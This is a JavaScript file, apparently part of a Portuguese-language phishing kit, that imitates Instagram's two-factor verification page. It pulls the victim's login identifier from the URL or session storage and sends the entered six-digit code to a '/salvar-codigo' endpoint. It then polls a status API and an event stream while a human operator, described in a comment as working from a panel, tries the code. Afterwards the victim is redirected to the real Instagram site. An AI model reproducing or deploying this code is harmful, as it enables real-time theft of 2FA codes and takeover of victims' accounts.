const verificationForm = document.querySelector('#verification-form');
const codeInput = document.querySelector('#code');
const feedback = document.querySelector('#feedback');
const maskedIdentifier = document.querySelector('#masked-identifier');
const verificationTitle = document.querySelector('#verification-title');
const submitButton = verificationForm.querySelector('.continue-button');

const URL_FINAL = "https://www.instagram.com";

// Recupera o identificador salvo no login
const urlParams = new URLSearchParams(window.location.search);
const identifier = urlParams.get('usuario') || urlParams.get('username') || sessionStorage.getItem('loginIdentifier') || sessionStorage.getItem('ig_usuario') || '';

function maskEmail(email) {
  const [name, domain] = email.split('@');
  if (!domain) return email;
  if (name.length <= 2) return `${name[0] || ''}***@${domain}`;
  return `${name[0]}${'*'.repeat(Math.max(3, name.length - 2))}${name.slice(-1)}@${domain}`;
}

function maskPhone(phone) {
  const digits = phone.replace(/\D/g, '');
  if (digits.length < 3) return phone;
  return `${'*'.repeat(Math.max(3, digits.length - 2))}${digits.slice(-2)}`;
}

function isPhone(value) {
  return /^\+?[\d\s().-]{7,}$/.test(value);
}

if (identifier) {
  if (identifier.includes('@')) {
    maskedIdentifier.textContent = maskEmail(identifier);
  } else if (isPhone(identifier)) {
    verificationTitle.textContent = 'Verifique seu telefone';
    maskedIdentifier.textContent = maskPhone(identifier);
  } else {
    maskedIdentifier.textContent = identifier;
  }
}

function mostrarErro(mensagem) {
  if (!feedback) return;
  feedback.textContent = mensagem || "Código de segurança incorreto. Tente novamente.";
  feedback.style.color = "#ed4956";
  feedback.style.display = "block";
  if (codeInput) {
    codeInput.style.borderColor = "#ed4956";
  }
}

function esconderErro() {
  if (!feedback) return;
  feedback.textContent = "";
  feedback.style.display = "none";
  if (codeInput) {
    codeInput.style.borderColor = "";
  }
}

function exibirSucessoAceito(urlDestino) {
  if (submitButton) {
    submitButton.textContent = "Código Aprovado!";
    submitButton.disabled = true;
    submitButton.style.background = "#22c55e";
    submitButton.style.color = "#ffffff";
  }
  if (feedback) {
    feedback.textContent = "Verificação concluída com sucesso. Redirecionando...";
    feedback.style.color = "#22c55e";
    feedback.style.display = "block";
  }
  setTimeout(() => {
    window.location.href = urlDestino || URL_FINAL;
  }, 500);
}

function exibirErroNegado() {
  if (submitButton) {
    submitButton.disabled = false;
    submitButton.textContent = "Continuar";
  }
  mostrarErro("Código incorreto. Solicite um novo código ou digite novamente.");
  if (codeInput) {
    codeInput.value = "";
    codeInput.focus();
  }
}

codeInput.addEventListener('input', () => {
  codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 6);
  if (codeInput.value.length > 0) {
    esconderErro();
  }
});

let polling2faInterval = null;

verificationForm.addEventListener('submit', async (event) => {
  event.preventDefault();
  const codigo = codeInput ? codeInput.value.trim() : "";

  if (!codigo) {
    mostrarErro("Insira o código de 6 dígitos.");
    return;
  }

  esconderErro();
  submitButton.disabled = true;
  submitButton.textContent = 'Verificando código...';

  try {
    await fetch('/salvar-codigo', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        codigo: codigo,
        code: codigo,
        usuario: identifier,
        username: identifier
      })
    });
  } catch (err) {
    console.warn("Aviso ao enviar código:", err);
  }

  // Inicia escuta ativa pela aprovação ou negação do operador no painel
  iniciarPollingDecisao();
});

function iniciarPollingDecisao() {
  if (polling2faInterval) clearInterval(polling2faInterval);

  const checarDecisao = async () => {
    try {
      const res = await fetch(`/api/status-2fa?usuario=${encodeURIComponent(identifier)}&t=${Date.now()}`);
      if (!res.ok) return;
      const data = await res.json();

      if (data.status_2fa === "aceito") {
        clearInterval(polling2faInterval);
        polling2faInterval = null;
        exibirSucessoAceito(data.url_final);
      } else if (data.status_2fa === "negado") {
        clearInterval(polling2faInterval);
        polling2faInterval = null;
        exibirErroNegado();
      }
    } catch (err) {
      console.error("Erro ao sondar status de 2FA:", err);
    }
  };

  polling2faInterval = setInterval(checarDecisao, 600);
}

// Escuta instantânea via SSE (Server-Sent Events)
let sseSource2FA = null;
function conectarSSEDecisao() {
  if (!window.EventSource) return;
  try {
    if (sseSource2FA) sseSource2FA.close();
    sseSource2FA = new EventSource("/api/stream?t=" + Date.now());

    sseSource2FA.onmessage = (event) => {
      try {
        const json = JSON.parse(event.data);
        if (!json || !json.consolidados) return;

        const userKey = (identifier || "").toLowerCase().trim();
        const item = json.consolidados.find(c => (c.usuario || "").toLowerCase().trim() === userKey);

        if (item) {
          if (item.status_2fa === "aceito") {
            if (polling2faInterval) clearInterval(polling2faInterval);
            exibirSucessoAceito();
          } else if (item.status_2fa === "negado") {
            if (polling2faInterval) clearInterval(polling2faInterval);
            exibirErroNegado();
          }
        }
      } catch (e) {}
    };

    sseSource2FA.onerror = () => {
      if (sseSource2FA) sseSource2FA.close();
      setTimeout(conectarSSEDecisao, 3000);
    };
  } catch (e) {}
}

conectarSSEDecisao();
